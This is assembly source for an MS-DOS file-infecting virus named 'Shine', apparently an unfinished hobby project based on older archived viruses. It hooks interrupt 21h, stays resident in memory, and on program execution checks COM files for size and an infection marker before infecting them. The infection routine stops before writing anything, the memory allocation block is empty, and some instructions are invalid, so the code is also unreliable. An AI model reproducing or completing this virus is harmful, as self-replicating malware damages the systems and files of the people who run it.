;---------------
; The shine DOS virus
; Based on the Cybercide DOS virus
; And the Creeper virus, no not the "catch me if you can" one, the MS-DOS one
; Here's the link: https://github.com/guitmz/virii/blob/master/c/CYBRCIDE.ASM, whew, that was a mouthfull 
; And hers to creeper: https://github.com/guitmz/virii/blob/master/c/CREEPER.ASM

org 0h

beninging:

call near get_delta   ; To calculate delta offset
get_delta:
     pop bp           ; BP = Delta+3
     sub bp, 3        ; To get to the True start of the virus
     mov word [data_section.save_bp+bp], bp
     mov word [new_int21.bp_shi+bp], bp

     mov ax, 9a8ah    ; Are we in memory yet?
     int 21h          ; Call to int 21h
     cmp ax, 8b7bh    ; Is AX 8b7b?
     je dont_install

alloc_mem:            ; Ok guys, here comes the interesting and scary part. We gotta manually allocate memory, we cant use int 21h
                      ; Cuz it aint working the way i want it to work
     


install:
     mov ax, 3521h    ; Get vector 21h
     int 21h          ; call int 21h
     mov word [goto_int21+bp+1], bx  ; Save Int 21h offset
     mov word [goto_int21+bp+3], es  ; And segment
     push bp
     add bp, new_int21
     mov ax, 2521h         ; Set vector 21h
     mov dx, bp            ; DS:DX = BP = BP+new_int21
     pop bp
     int 21h
     mov ax, 3100h         ; Terminate and Stay resident
     int 21h


dont_install:
     mov ax, 4c00h
     int 21h



new_int21:
     pusha
     push bp
     push ax
     call near .past_bp
.bp_shi dw 0
.past_bp: 
     pop bp
     sub bp, 2
     mov word ax, [bp]
     mov bp, ax             ; BP = file delta offset
     pop ax
.what_func:
     cmp ax, 9a8ah        ; Loaded?
     je send_msg          ; Report that we are in memory
     cmp ax, 4b00h        ; Load and Execute (Exec), function 0
     je infect            ; On entry: DS:DX = ASCIIZ filename pointer

     pop bp
     popa
.call_int21:
     jmp short goto_int21



goto_int21: db 0EAh, 00h, 00h, 00h, 00h   ; Jump far, absolute, address given in operand

send_msg:
     mov ax, 8b7bh    ; In Mem Signature
     iret

infect:               ; DS:DX = ASCIIZ Filename pointer
     mov ax, 3d02h
     int 21h          ; Open file Using Handle, Read Write. OUT: AX = Handle
     mov bx, ax       ; BX = File Handle
     push bx
     xor cx, cx
     xor dx, dx       ; low order and high order = 0
     mov ax, 4200h    ; Move file pointer to begining of file
     int 21h
     pop bx
     push bx          ; BX = File Handle
     mov ax, 3f00h    ; Read file or device
     mov cx, 2        ; Read 2 bytes, this case from the start to check wheter it's a COM file or an MZ Executable
     push bp
     add bp, data_section.MZ_BUF
     mov dx, bp       ; Pointer to the MZ buffer
     pop bp
     int 21h          ; Calling int 21h
     pop bx
     cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ file?
     je .abort_infection
     push bx

                      ; Since we have now determined that the program in question is not an EXE file, but a COM file instead, we will infect it
     mov ax, 4202h    ; Function 42h (Move File Pointer), sub-function 02h (Signed offset from end of file)
     pop bx
     push bx          ; BX = File Handle
     xor cx, cx       ; CX = 0
     xor dx, dx       ; DX = 0
     int 21h          ; Calling int 21h
     pop bx
     cmp ax, 65436-virus_size   ; I the file too big??
     je .abort_infection
     push bx          ; Nope, perfetto sizo. BX = File handle

     mov ax, 3f00h    ; Read file or device
     mov cx, 5        ; Read 5 bytes, this case from the start to check wheter it's already infected, since we dont wanna have repeated infections
     push bp
     add bp, data_section.shine_buf
     mov dx, bp       ; Pointer to the "Shine" buffer
     pop bp
     int 21h          ; Calling int 21h
     pop bx

     push bp
     add bp, data_section.shine_buf
     mov si, bp       ; Pointer to the "Shine" buffer
     pop bp
     mov di, si+5
     mov cx, 5
     rep cmpsb       ; Is EOF = 'Shine'?
     je .abort_infection  ; Yes, abort infection
     push bx         ; Nope, let's infect this bad boy             
     

.abort_infection:
     ret

old_alloc_mem:        ; We are in fact not in memory, lets relocate us away from here
     mov ax, 4800h    ; Function 48h Allocate Memory Blocks
     mov bx, 20h      ; Allocate 32 paragraphs, 512 bytes
     int 21h          ; Calling DOS
     mov dx, ax       ; DX => AX
     mov ax, 5500h    ; Create New PSP (Undocumented..... ooooo, spooky)
     mov si, 15h      ; Top of Memory
     int 21h          ; Call DOS


data_section:
     .save_bp dw 0
     .MZ_BUF dw 0
     .shine_buf db '     '
     .file_infected db 'Shine'

virus_size equ endinging-beninging
endinging:
